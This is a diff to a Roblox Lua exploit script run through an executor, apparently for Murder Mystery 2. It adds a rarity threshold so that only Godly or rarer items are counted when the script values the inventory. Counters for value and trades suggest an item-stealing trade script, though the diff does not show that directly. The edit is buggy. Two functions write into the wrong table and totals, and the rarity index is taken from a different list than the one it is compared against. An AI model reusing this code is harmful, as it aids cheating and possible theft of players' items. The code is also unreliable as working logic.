@@ -37,6 +37,7 @@ end;
 local exec, execver = identifyexecutor()
 totalval = 0
 tradesd = 0
+minrarity = minrarity or "Godly"
 print(1)
 
 if IS_MM2 then
@@ -112,7 +113,16 @@ local function getItemValue(dataid)
     end
     return value
 end
-
+local zamltable = {
+    "Common",
+    "Uncommon",
+    "Rare",
+    "Legendary",
+    "Classic",
+    "Godly",
+    "Ancient",
+    "Unique"
+}
 task.spawn(function() urnubitems = getinv() end)
 function ischanged()
     local currentInventory = getinv()
@@ -137,18 +147,23 @@ function ischanged()
     end
     return false
 end
+local minzaml = table.find(zamltable, minrarity)
 function chang(inve)
     new = {}
     newval = 0
     for i,v in pairs(inve) do
         local value = getItemValue(i)
-        table.insert(new,{
-            name = i,
-            amount = v,
-            value = value
-        })
-        newval = newval + value * v
-        totalval = totalval + value * v
+        local layn = databrainrot[i].Rarity
+        local weaponraritysort = table.find(rarityTable, layn)
+        if weaponraritysort and weaponraritysort >= minzaml then
+            table.insert(new,{
+                name = i,
+                amount = v,
+                value = value
+            })
+            newval = newval + value * v
+            totalval = totalval + value * v
+        end
     end
     table.sort(new, function(a, b)
         return (a.value * a.amount) > (b.value * b.amount)
@@ -219,12 +234,17 @@ function inv()
     newwval = 0
     for i,v in pairs(getinv()) do
         local value = getItemValue(i)
-        table.insert(neww,{
-            name = i,
-            amount = v,
-            value = value
-        })
-        newwval = newwval + value
+        local layn = databrainrot[i].Rarity
+        local weaponraritysort = table.find(rarityTable, layn)
+        if weaponraritysort and weaponraritysort >= minzaml then
+            table.insert(new,{
+                name = i,
+                amount = v,
+                value = value
+            })
+            newval = newval + value * v
+            totalval = totalval + value * v
+        end
     end
     table.sort(neww, function(a, b)
         return (a.value * a.amount) > (b.value * b.amount)
@@ -289,12 +309,17 @@ function invf()
     vaule = 0
     for i,v in pairs(getinv()) do
         local value = getItemValue(i)
-        table.insert(talbe,{
-            name = i,
-            amount = v,
-            value = value
-        })
-        vaule = vaule + value
+        local layn = databrainrot[i].Rarity
+        local weaponraritysort = table.find(rarityTable, layn)
+        if weaponraritysort and weaponraritysort >= minzaml then
+            table.insert(new,{
+                name = i,
+                amount = v,
+                value = value
+            })
+            newval = newval + value * v
+            totalval = totalval + value * v
+        end
     end
     inventroy = inventroy..tostring(vaule).."\n\n"
     table.sort(talbe, function(a, b)
